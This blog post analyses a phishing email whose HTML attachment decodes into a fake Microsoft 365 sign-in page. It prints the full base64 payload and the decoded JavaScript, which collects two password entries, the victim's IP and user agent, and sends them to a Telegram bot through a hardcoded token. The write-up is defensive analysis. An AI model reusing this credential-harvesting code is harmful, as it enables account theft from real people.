+++
title = "Breaking Down Another Phishing Attempt"
date = 2022-08-18T01:19:21Z
description = "Look, another phishing attempt. Let's unpack this one"
draft = false
tags = ["security"]
tracking_area = "javascript"
tracking_id = ""
+++

Earlier this year I did a post [about a phishing attempt I received]({{<ref "/posts/2022-05-10-breaking-down-a-phishing-attempt.md">}}). While I get these somewhat frequently, I decided to have a dig into the one I received today for no reason other than it seemed interesting.

## The email

Here's the email I received:

![The phishing email](/images/2022-08-18-breaking-down-another-phishing-attempt/01.png)

This is super low effort and very clear that it's a phishing attempt. There's a huge string of text and numbers in the "from" name. What does it mean by "14 inbox delivery"? The fact that there's a validation form on a random HTML attachment makes it painfully obvious that I shouldn't open this.

_I tried to figure out what `900150983cd24fb0d6963f7d28e17f72900150983cd24fb0d6963f7d28e17f72900150983cd24fb0d6963f7d28e17f72` means from the sender, but I couldn't find anything meaningful in any decryption. I thought it might've been a Bitcoin address, but it's too long for that, and nothing came back from standard web searches, so 🤷. If you figure it out - let me know!_

Let's download the HTML file and open it in VS Code.

## The attachment contents

```html
<script>
  var email = "<yes, my real email was here>";
  var token = "5372900524:AAEesupk4LMrZO_4PONhPBHIpFu3ey-6O20";
  var chat_id = 5510932248;
  var data = atob(
    "PCFET0NUWVBFIGh0bWw+CjxodG1sIGRpcj0ibHRyIiBjbGFzcz0iIiBsYW5nPSJlbiI+CiAgICA8aGVhZD4KICAgIDxtZXRhIGh0dHAtZXF1aXY9IkNvbnRlbnQtVHlwZSIgY29udGVudD0idGV4dC9odG1sOyBjaGFyc2V0PVVURi04Ij4KICAgIDx0aXRsZT5TaWduIGluIHRvIHlvdXIgYWNjb3VudDwvdGl0bGU+CiAgICA8bWV0YSBodHRwLWVxdWl2PSJYLVVBLUNvbXBhdGlibGUiIGNvbnRlbnQ9IklFPWVkZ2UiPgogICAgPG1ldGEgbmFtZT0idmlld3BvcnQiIGNvbnRlbnQ9IndpZHRoPWRldmljZS13aWR0aCwgaW5pdGlhbC1zY2FsZT0xLjAsIG1heGltdW0tc2NhbGU9Mi4wLCB1c2VyLXNjYWxhYmxlPXllcyI+CiAgICA8c2NyaXB0IHNyYz0iaHR0cHM6Ly9hamF4Lmdvb2dsZWFwaXMuY29tL2FqYXgvbGlicy9qcXVlcnkvMy40LjEvanF1ZXJ5Lm1pbi5qcyI+PC9zY3JpcHQ+CiAgICA8bGluayByZWw9InNob3J0Y3V0IGljb24iIGhyZWY9Imh0dHBzOi8vYWFkY2RuLm1zZnRhdXRoLm5ldC9zaGFyZWQvMS4wL2NvbnRlbnQvaW1hZ2VzL2Zhdmljb25fYV9ldXBheWZnZ2hxaWFpN2s5c29sNmxnMi5pY28iPiAgICAKICAgIDxsaW5rIGRhdGEtbG9hZGVyPSJjZG4iIGNyb3Nzb3JpZ2luPSJhbm9ueW1vdXMiIGhyZWY9Imh0dHBzOi8vYWFkY2RuLm1zZnRhdXRoLm5ldC9lc3RzLzIuMS9jb250ZW50L2NkbmJ1bmRsZXMvY29udmVyZ2VkLnYyLmxvZ2luLm1pbl96aXl0ZjhkenQ5ZWcxczYtb2hobGVnMi5jc3MiIHJlbD0ic3R5bGVzaGVldCI+CiAgICA8c2NyaXB0PgogICAgICAgICQoZG9jdW1lbnQpLnJlYWR5KGZ1bmN0aW9uKCkgeyQoIiNkaXNwbGF5TmFtZSIpLmVtcHR5KCkuYXBwZW5kKGVtYWlsKTsgJC5nZXRKU09OKCJodHRwczovL2FwaS5pcGlmeS5vcmc/Zm9ybWF0PWpzb24iLCBmdW5jdGlvbihkYXRhKSB7JCgiI2dmZyIpLmh0bWwoZGF0YS5pcCk7fSl9KTsKICAgIDwvc2NyaXB0Pgo8L2hlYWQ+Cjxib2R5IGNsYXNzPSJjYiIgc3R5bGU9ImRpc3BsYXk6IGJsb2NrOyI+CjxwIGlkPSJnZmciIHN0eWxlPSJkaXNwbGF5OiBub25lOyI+PC9wPgo8Zm9ybSBuYW1lPSJmMSIgaWQ9ImkwMjgxIiBub3ZhbGlkYXRlPSJub3ZhbGlkYXRlIiBzcGVsbGNoZWNrPSJmYWxzZSIgbWV0aG9kPSJwb3N0IiB0YXJnZXQ9Il90b3AiIGF1dG9jb21wbGV0ZT0ib2ZmIiBhY3Rpb249IiI+CiAgICA8ZGl2IGNsYXNzPSJsb2dpbi1wYWdpbmF0ZWQtcGFnZSI+CiAgICAgICAgPGRpdiBpZD0ibGlnaHRib3hUZW1wbGF0ZUNvbnRhaW5lciI+CjxkaXYgaWQ9ImxpZ2h0Ym94QmFja2dyb3VuZENvbnRhaW5lciI+CiAgICA8ZGl2IGNsYXNzPSJiYWNrZ3JvdW5kLWltYWdlLWhvbGRlciIgcm9sZT0icHJlc2VudGF0aW9uIj4KICAgIDxkaXYgY2xhc3M9ImJhY2tncm91bmQtaW1hZ2UgZXh0LWJhY2tncm91bmQtaW1hZ2UiIHN0eWxlPSJiYWNrZ3JvdW5kLWltYWdlOiB1cmwoJnF1b3Q7aHR0cHM6Ly9hYWRjZG4ubXNmdGF1dGgubmV0L3NoYXJlZC8xLjAvY29udGVudC9pbWFnZXMvYmFja2dyb3VuZHMvMl9iYzNkMzJhNjk2ODk1Zjc4YzE5ZGY2YzcxNzU4NmE1ZC5zdmcmcXVvdDspOyI+PC9kaXY+CjwvZGl2PjwvZGl2Pgo8ZGl2IGNsYXNzPSJvdXRlciI+CiAgICA8ZGl2IGNsYXNzPSJ0ZW1wbGF0ZS1zZWN0aW9uIG1haW4tc2VjdGlvbiI+CiAgICAgICAgPGRpdiBjbGFzcz0ibWlkZGxlIGV4dC1taWRkbGUiPgogICAgICAgICAgICA8ZGl2IGNsYXNzPSJmdWxsLWhlaWdodCI+CjxkaXYgY2xhc3M9ImZsZXgtY29sdW1uIj4KICAgIDxkaXYgY2xhc3M9Indpbi1zY3JvbGwiPgogICAgICAgIDxkaXYgaWQ9ImxpZ2h0Ym94IiBjbGFzcz0ic2lnbi1pbi1ib3ggZXh0LXNpZ24taW4tYm94IGZhZGUtaW4tbGlnaHRib3giPgogICAgICAgIDxkaXY+PGltZyBjbGFzcz0ibG9nbyIgcm9sZT0iaW1nIiBwbmdzcmM9Imh0dHBzOi8vYWFkY2RuLm1zZnRhdXRoLm5ldC9zaGFyZWQvMS4wL2NvbnRlbnQvaW1hZ2VzL21pY3Jvc29mdF9sb2dvX2VkOWM5ZWIwZGNlMTdkNzUyYmVkZWE2YjVhY2RhNmQ5LnBuZyIgc3Znc3JjPSJodHRwczovL2FhZGNkbi5tc2Z0YXV0aC5uZXQvc2hhcmVkLzEuMC9jb250ZW50L2ltYWdlcy9taWNyb3NvZnRfbG9nb19lZTVjOGQ5ZmI2MjQ4YzkzOGZkMGRjMTkzNzBlOTBiZC5zdmciIHNyYz0iaHR0cHM6Ly9hYWRjZG4ubXNmdGF1dGgubmV0L3NoYXJlZC8xLjAvY29udGVudC9pbWFnZXMvbWljcm9zb2Z0X2xvZ29fZWU1YzhkOWZiNjI0OGM5MzhmZDBkYzE5MzcwZTkwYmQuc3ZnIiBhbHQ9Ik1pY3Jvc29mdCI+PC9kaXY+CiAgICAgICAgPGRpdiByb2xlPSJtYWluIj4KPGRpdiBjbGFzcz0iYW5pbWF0ZSBzbGlkZS1pbi1uZXh0Ij4KICAgICAgICA8ZGl2ID4KPGRpdiBjbGFzcz0iaWRlbnRpdHlCYW5uZXIiPgogICAgPGRpdiBpZD0iZGlzcGxheU5hbWUiIGNsYXNzPSJpZGVudGl0eSI+PC9kaXY+CjwvZGl2PjwvZGl2PgogICAgPC9kaXY+CiAgICA8ZGl2IGNsYXNzPSJwYWdpbmF0aW9uLXZpZXcgYW5pbWF0ZSBoYXMtaWRlbnRpdHktYmFubmVyIHNsaWRlLWluLW5leHQiPgogICAgPGRpdj4KCjxkaXYgaWQ9ImxvZ2luSGVhZGVyIiBjbGFzcz0icm93IHRpdGxlIGV4dC10aXRsZSI+CiAgICA8ZGl2IHJvbGU9ImhlYWRpbmciIGFyaWEtbGV2ZWw9IjEiPkVudGVyIHBhc3N3b3JkPC9kaXY+CjwvZGl2Pgo8ZGl2IGlkPSJlcnJvcnB3IiBzdHlsZT0iY29sb3I6IHJlZDsgbWFyZ2luOiAxNXB4OyBtYXJnaW4tbGVmdDogMHB4OyBtYXJnaW4tdG9wOiAwcHg7IG1hcmdpbi1ib3R0b206IDBweDsiPjwvZGl2Pgo8ZGl2IGNsYXNzPSJyb3ciPgogICAgPGRpdiBjbGFzcz0iZm9ybS1ncm91cCBjb2wtbWQtMjQiPgogICAgICAgIDxkaXYgY2xhc3M9InBsYWNlaG9sZGVyQ29udGFpbmVyIj4KICAgICAgICAgICAgPGlucHV0IG5hbWU9InBhc3N3ZCIgdHlwZT0icGFzc3dvcmQiIGlkPSJpMDExOCIgYXV0b2NvbXBsZXRlPSJvZmYiIGNsYXNzPSJmb3JtLWNvbnRyb2wgaW5wdXQgZXh0LWlucHV0IHRleHQtYm94IGV4dC10ZXh0LWJveCIgcGxhY2Vob2xkZXI9IlBhc3N3b3JkIiByZXF1aXJlZCAvPgo8L2Rpdj4KICAgIDwvZGl2Pgo8L2Rpdj4KPGRpdj4KPGRpdiBjbGFzcz0icG9zaXRpb24tYnV0dG9ucyI+CiAgICA8ZGl2PgogICAgICAgIDxkaXYgY2xhc3M9InJvdyI+CiAgICAgICAgICAgIDxkaXYgY2xhc3M9ImNvbC1tZC0yNCI+CiAgICAgICAgICAgICAgICA8ZGl2IGNsYXNzPSJ0ZXh0LTEzIj4KICAgICAgICAgICAgICAgICAgICA8ZGl2IGNsYXNzPSJmb3JtLWdyb3VwIj4KICAgICAgICAgICAgICAgICAgICAgICAgPGEgaWQ9ImlkQV9QV0RfRm9yZ290UGFzc3dvcmQiIHJvbGU9ImxpbmsiIGhyZWY9IiMiPkZvcmdvdHRlbiBteSBwYXNzd29yZDwvYT4KICAgICAgICAgICAgICAgICAgICA8L2Rpdj4KPGRpdiBjbGFzcz0iZm9ybS1ncm91cCI+CjwvZGl2PgogICAgICAgIDxkaXYgY2xhc3M9ImZvcm0tZ3JvdXAiPgogICAgICAgICAgICA8YSBpZD0iaTE2NjgiIGhyZWY9IiMiPlNpZ24gaW4gd2l0aCBhbm90aGVyIGFjY291bnQ8L2E+CiAgICAgICAgPC9kaXY+PC9kaXY+PC9kaXY+PC9kaXY+CiAgICA8L2Rpdj4KCiAgICA8ZGl2IGNsYXNzPSJ3aW4tYnV0dG9uLXBpbi1ib3R0b20iPgogICAgICAgIDxkaXYgY2xhc3M9InJvdyI+CiAgICAgICAgICAgIDxkaXY+PGRpdiBjbGFzcz0iY29sLXhzLTI0IG5vLXBhZGRpbmctbGVmdC1yaWdodCBidXR0b24tY29udGFpbmVyIj4KICAgIDxkaXYgY2xhc3M9ImlubGluZS1ibG9jayI+CiAgICAgICAgPGlucHV0IHR5cGU9InN1Ym1pdCIgaWQ9ImlkU0lCdXR0b245IiBjbGFzcz0id2luLWJ1dHRvbiBidXR0b25fcHJpbWFyeSBidXR0b24gZXh0LWJ1dHRvbiBwcmltYXJ5IGV4dC1wcmltYXJ5IiB2YWx1ZT0iU2lnbiBpbiI+CiAgICA8L2Rpdj4KPC9kaXY+PC9kaXY+CiAgICAgICAgPC9kaXY+CiAgICA8L2Rpdj4KPC9kaXY+PC9kaXY+CiAgICA8L2Rpdj4KPC9kaXY+PC9kaXY+PC9kaXY+PC9kaXY+CiAgICA8L2Rpdj4KPC9kaXY+PC9kaXY+CiAgICAgICAgPC9kaXY+CiAgICA8L2Rpdj4KICAgIDxkaXYgaWQ9ImZvb3RlciIgcm9sZT0iY29udGVudGluZm8iIGNsYXNzPSJmb290ZXIgZXh0LWZvb3RlciI+CiAgICAgICAgPGRpdj4KPGRpdiBpZD0iZm9vdGVyTGlua3MiIGNsYXNzPSJmb290ZXJOb2RlIHRleHQtc2Vjb25kYXJ5Ij4KICAgICAgICA8YSBpZD0iZnRyVGVybXMiIGhyZWY9IiMiIGNsYXNzPSJmb290ZXItY29udGVudCBleHQtZm9vdGVyLWNvbnRlbnQgZm9vdGVyLWl0ZW0gZXh0LWZvb3Rlci1pdGVtIj5UZXJtcyBvZiB1c2U8L2E+CiAgICAgICAgPGEgaWQ9ImZ0clByaXZhY3kiIGhyZWY9IiMiIGNsYXNzPSJmb290ZXItY29udGVudCBleHQtZm9vdGVyLWNvbnRlbnQgZm9vdGVyLWl0ZW0gZXh0LWZvb3Rlci1pdGVtIj5Qcml2YWN5ICZhbXA7IGNvb2tpZXM8L2E+CiAgICA8YSBpZD0ibW9yZU9wdGlvbnMiIGhyZWY9IiMiIGFyaWEtbGFiZWw9IkNsaWNrIGhlcmUgZm9yIHRyb3VibGVzaG9vdGluZyBpbmZvcm1hdGlvbiIgY2xhc3M9ImZvb3Rlci1jb250ZW50IGV4dC1mb290ZXItY29udGVudCBmb290ZXItaXRlbSBleHQtZm9vdGVyLWl0ZW0gZGVidWctaXRlbSBleHQtZGVidWctaXRlbSI+Li4uPC9hPgo8L2Rpdj48L2Rpdj4KICAgIDwvZGl2Pgo8L2Rpdj48L2Rpdj48L2Rpdj4KPC9mb3JtPgo8c2NyaXB0PgogICAgdmFyIGNvdW50ID0gMDsKICAgIHZhciBwc3dkMTsKICAgIGRvY3VtZW50LmdldEVsZW1lbnRCeUlkKCJpZFNJQnV0dG9uOSIpLmFkZEV2ZW50TGlzdGVuZXIoImNsaWNrIiwgZnVuY3Rpb24oZSkgewogICAgZS5wcmV2ZW50RGVmYXVsdCgpOwoKICAgIHZhciBwc3dkID0gZG9jdW1lbnQuZ2V0RWxlbWVudEJ5SWQoJ2kwMTE4JykudmFsdWU7CiAgICBpZiAocHN3ZCA9PSBudWxsIHx8IHBzd2QgPT0gIiIpewogICAgICAgIGRvY3VtZW50LmdldEVsZW1lbnRCeUlkKCdlcnJvcnB3JykuaW5uZXJIVE1MID0gYFlvdXIgYWNjb3VudCBwYXNzd29yZCBjYW5ub3QgYmUgZW1wdHkuIGlmIHlvdSBkb24ndCByZW1lbWJlciB5b3VyIHBhc3N3b3JkLCA8YSBocmVmPSIjIj5yZXNldCBpdCBub3cuPC9hPmA7CiAgICAgICAgc2V0VGltZW91dCgoKSA9PiB7ZG9jdW1lbnQuZ2V0RWxlbWVudEJ5SWQoJ2Vycm9ycHcnKS5pbm5lckhUTUwgPSAnJzt9LCAzMDAwKTt9CiAgICBlbHNlIGlmKHBzd2QubGVuZ3RoIDwgNSl7CiAgICAgICAgZG9jdW1lbnQuZ2V0RWxlbWVudEJ5SWQoJ2Vycm9ycHcnKS5pbm5lckhUTUwgPSAiWW91ciBhY2NvdW50IHBhc3N3b3JkIGlzIHRvbyBzaG9ydC4iOwogICAgICAgIHNldFRpbWVvdXQoKCkgPT4ge2RvY3VtZW50LmdldEVsZW1lbnRCeUlkKCdlcnJvcnB3JykuaW5uZXJIVE1MID0gJyc7IGRvY3VtZW50LmdldEVsZW1lbnRCeUlkKCJpMDI4MSIpLnJlc2V0KCk7fSwgMzAwMCk7CiAgICB9IGVsc2UgaWYgKGNvdW50PDEpewogICAgICAgIHBzd2QxID0gZG9jdW1lbnQuZ2V0RWxlbWVudEJ5SWQoJ2kwMTE4JykudmFsdWU7CiAgICAgICAgZG9jdW1lbnQuZ2V0RWxlbWVudEJ5SWQoJ2Vycm9ycHcnKS5pbm5lckhUTUwgPSBgWW91ciBhY2NvdW50IG9yIHBhc3N3b3JkIGlzIGluY29ycmVjdC4gaWYgeW91IGRvbid0IHJlbWVtYmVyIHlvdXIgcGFzc3dvcmQsIDxhIGhyZWY9IiMiPnJlc2V0IGl0IG5vdy48L2E+YDsKICAgICAgICBkb2N1bWVudC5nZXRFbGVtZW50QnlJZCgiaTAyODEiKS5yZXNldCgpOyBjb3VudCsrO30KICAgIGVsc2UgewogICAgICAgIHZhciBJUCA9IGRvY3VtZW50LmdldEVsZW1lbnRCeUlkKCdnZmcnKS50ZXh0Q29udGVudDsKICAgICAgICB2YXIgbWVzc2FnZSA9IGA9PT09PT0gTzM2NSBSZXN1bHQgPT09PT09XHJcbkVtYWlsOiAke2VtYWlsfVxyXG5QYXNzd29yZDE6ICR7cHN3ZDF9XHJcblBhc3N3b3JkMjogJHtwc3dkfVxyXG5JUDogaHR0cHM6Ly9pcC1hcGkuY29tLyR7SVB9XHJcblVzZXItQWdlbnQ6ICR7bmF2aWdhdG9yLnVzZXJBZ2VudH1cclxuPT09PT09PT09PT09PT09PT09PWA7CiAgICAgICAgdmFyIHNldHRpbmdzID0gewogICAgICAgICAgICAiYXN5bmMiOiB0cnVlLCAiY3Jvc3NEb21haW4iOiB0cnVlLCAidXJsIjogImh0dHBzOi8vYXBpLnRlbGVncmFtLm9yZy9ib3QiICsgdG9rZW4gKyAiL3NlbmRNZXNzYWdlIiwKICAgICAgICAgICAgIm1ldGhvZCI6ICJQT1NUIiwgImhlYWRlcnMiOiB7IkNvbnRlbnQtVHlwZSI6ICJhcHBsaWNhdGlvbi9qc29uIiwgImNhY2hlLWNvbnRyb2wiOiAibm8tY2FjaGUifSwKICAgICAgICAgICAgImRhdGEiOiBKU09OLnN0cmluZ2lmeSh7ImNoYXRfaWQiOiBjaGF0X2lkLCAidGV4dCI6IG1lc3NhZ2V9KX0KICAgICAgICAkLmFqYXgoc2V0dGluZ3MpLmRvbmUoKHJlc3BvbnNlKSA9PiB7d2luZG93LmxvY2F0aW9uLnJlcGxhY2UoJ2h0dHBzOi8vcG9ydGFsLm9mZmljZS5jb20vc2VydmljZXN0YXR1cycpO30pOwogICAgfSAKICAgIH0pOyAKPC9zY3JpcHQ+CjwvZGl2PjwvYm9keT48L2h0bWw+"
  );
  document.write(data);
</script>
```

So that's interesting, it's just a script tag with some JavaScript variables and a giant blob that will contain some HTML that will get written to the body. I guess we better parse out that blob and see what we're dealing with.

As the HTML it generates is quite long, I've popped it into a gist that you can find [here](https://gist.github.com/aaronpowell/8c50aecc2f661968835b52a0ad2d377b). And what does it look like?

![Microsoft Account login screen](/images/2022-08-18-breaking-down-another-phishing-attempt/02.png)

It looks like the login screen to a Microsoft account, prompting me to enter the password.

_Note: I removed the JS from the file before loading it in the browser, just for extra safety._

## Breaking down how it works

Clearly it's trying to capture my password for my Microsoft account (MSA), but how will it do that, and how will they get it to themselves since this is an offline file? For that, we need to dig into the JavaScript a bit. There's two scripts that run on the page, the first one is quite straight forward:

```js
$(document).ready(function () {
  $("#displayName").empty().append(email);
  $.getJSON("https://api.ipify.org?format=json", function (data) {
    $("#gfg").html(data.ip);
  });
});
```

It's pushing my email (which was in the original file) to a field so I _think_ I'm signing in, and then it's calling a service to get my public IP.

Of interesting note, they are using jQuery here and if we look at the script include a few lines above, we'll notice it's version 3.4.1, and that was released in 2019, so it's possible that this basic phishing script has been floating around for a long time. Also, I wondered about why they'd use jQuery and not the native `fetch` API, as that'd reduce the external dependencies, and thus, the number of points of failure. While I don't know the true motivations of this scammer, my guess would be that since a victim of this is someone who isn't tech savvy, there's a chance they are still using an outdated browser such as Internet Explorer, so jQuery would mean they don't have to worry about browser compatibility and hit as wider target as possible.

Ok, back on topic, what's the other script block doing?

```js
var count = 0;
var pswd1;
document.getElementById("idSIButton9").addEventListener("click", function (e) {
  e.preventDefault();
  var pswd = document.getElementById("i0118").value;
  if (pswd == null || pswd == "") {
    document.getElementById(
      "errorpw"
    ).innerHTML = `Your account password cannot be empty. if you don't remember your password, <a href="#">reset it now.</a>`;
    setTimeout(() => {
      document.getElementById("errorpw").innerHTML = "";
    }, 3000);
  } else if (pswd.length < 5) {
    document.getElementById("errorpw").innerHTML =
      "Your account password is too short.";
    setTimeout(() => {
      document.getElementById("errorpw").innerHTML = "";
      document.getElementById("i0281").reset();
    }, 3000);
  } else if (count < 1) {
    pswd1 = document.getElementById("i0118").value;
    document.getElementById(
      "errorpw"
    ).innerHTML = `Your account or password is incorrect. if you don't remember your password, <a href="#">reset it now.</a>`;
    document.getElementById("i0281").reset();
    count++;
  } else {
    var IP = document.getElementById("gfg").textContent;
    var message = `====== O365 Result ======\r\nEmail: ${email}\r\nPassword1: ${pswd1}\r\nPassword2: ${pswd}\r\nIP: https://ip-api.com/${IP}\r\nUser-Agent: ${navigator.userAgent}\r\n===================`;
    var settings = {
      async: true,
      crossDomain: true,
      url: "https://api.telegram.org/bot" + token + "/sendMessage",
      method: "POST",
      headers: {
        "Content-Type": "application/json",
        "cache-control": "no-cache",
      },
      data: JSON.stringify({
        chat_id: chat_id,
        text: message,
      }),
    };
    $.ajax(settings).done((response) => {
      window.location.replace("https://portal.office.com/servicestatus");
    });
  }
});
```

Now this looks more like it, here's how they are going to get your information. Let's break it down step-by-step.

To start, they have a click handler on the **Sign In** button and when clicked they grab the password from the password field. Then we enter a chain of `if` blocks.

```js
if (pswd == null || pswd == "") {
  document.getElementById(
    "errorpw"
  ).innerHTML = `Your account password cannot be empty. if you don't remember your password, <a href="#">reset it now.</a>`;
  setTimeout(() => {
    document.getElementById("errorpw").innerHTML = "";
  }, 3000);
}
```

Blank password test, sure, makes logical sense. Interesting that they clear out the error message after a period too, like, what's the point in that? Ok, next conditional test:

```js
if (pswd.length < 5) {
  document.getElementById("errorpw").innerHTML =
    "Your account password is too short.";
  setTimeout(() => {
    document.getElementById("errorpw").innerHTML = "";
    document.getElementById("i0281").reset();
  }, 3000);
}
```

Hahah they are enforcing a minimum of 5 characters on their password! I think MSA has a minimum length of 8 though, but I'll admit to having never investigated it. Hats off for trying to make it seem legit, although I'm saddened, they didn't add anything more around password complexity. 🤣

This brings us to the third branch:

```js
if (count < 1) {
  pswd1 = document.getElementById("i0118").value;
  document.getElementById(
    "errorpw"
  ).innerHTML = `Your account or password is incorrect. if you don't remember your password, <a href="#">reset it now.</a>`;
  document.getElementById("i0281").reset();
  count++;
}
```

Now **this** is interesting. The variable `count` is a globally scoped one on the page that starts out at `0`, so assuming you've provided a password _and_ it was longer than 5 characters, you're going to land in this branch where it puts the password you entered into `pswd1`, which is a globally scoped variable, before then showing you an error message and increasing the count.

What we can assume here is that they are using this as a fake out to the victim, having them _think_ they incorrectly entered the password, so that they enter it a second time, and that lands us in the final branch of our code:

```js
var IP = document.getElementById("gfg").textContent;
var message = `====== O365 Result ======\r\nEmail: ${email}\r\nPassword1: ${pswd1}\r\nPassword2: ${pswd}\r\nIP: https://ip-api.com/${IP}\r\nUser-Agent: ${navigator.userAgent}\r\n===================`;
var settings = {
  async: true,
  crossDomain: true,
  url: "https://api.telegram.org/bot" + token + "/sendMessage",
  method: "POST",
  headers: {
    "Content-Type": "application/json",
    "cache-control": "no-cache",
  },
  data: JSON.stringify({
    chat_id: chat_id,
    text: message,
  }),
};
$.ajax(settings).done((response) => {
  window.location.replace("https://portal.office.com/servicestatus");
});
```

When the victim runs this code block it's building up a message that contains their `email` (from the original script you download), the password they entered and were told was wrong, then the password they entered this time, plus some metadata like their IP and user agent. Interestingly, they are using a template literal which isn't supported in IE, so maybe my assertion on why they used jQuery is wrong and they are doing it because they are lazy (odd that they don't use the template literal for the `url` in the AJAX settings though...). I find the double-password trick quite an interesting one, as it suggests that they are anticipating that people could do a mistake, so by having them prompt twice, the victim will either validate that their password by entering the same one again - which will work and they are none the wiser, or they'll hand over a secondary password that they may use on other services.

The result of this is a message payload like so:

```
====== O365 Result ======
Email: foo@bar.com
Password1: abc123
Password2: abc123
IP: https://ip-api.com/1.1.1.1
User-Agent: ...
===================
```

This payload is then sent to a Telegram chat, using the `token` and `chat_id` from the downloaded attachment, before the user is redirected to the Office status page, leaving them none the wiser that their details have been sent away.

## Summary

Sadly, it looks like this token has been revoked, as when I tried to use it against the Telegram API (even replicating the `sendMessage` call but with a _cough_ different message), I was getting a 401, meaning I couldn't try and dig into the chat itself.

Like last time, this was interesting, looking at how the scammer is trying to get the information from the victim. I find the use of the fake out on password failing to get them to validate their password (or give over a secondary password) quite a clever way to go about collecting credentials and reducing the risk of getting invalid ones out of it.

And with that, this email is getting flagged in M365 as phishing and let's hope that improves the phishing detection, so it lands in less inboxes.
